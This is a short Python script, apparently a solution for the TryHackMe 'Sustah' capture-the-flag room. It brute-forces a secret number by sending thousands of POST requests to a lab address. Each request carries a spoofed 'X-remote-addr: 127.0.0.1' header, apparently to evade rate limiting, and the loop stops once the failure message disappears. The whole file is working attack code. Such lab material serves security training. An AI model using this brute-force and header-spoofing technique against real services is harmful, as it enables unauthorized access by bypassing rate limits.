#!/usr/bin/env python
# https://0xsanz.medium.com/sustah-tryhackme-45550a6fe7e3
import requests

for x in range(10000, 25000):
    r = requests.post('http://10.10.190.110:8085', data = {'number':x},headers = {'X-remote-addr': '127.0.0.1'})
    reply = r.text
    if "Oh no! How unlucky. Spin the wheel and try again" in r.text:
        print("No Dice :( for Number " + str(x))
    else:
        print("Bingo!! Number is " + str(x))
        exit(0)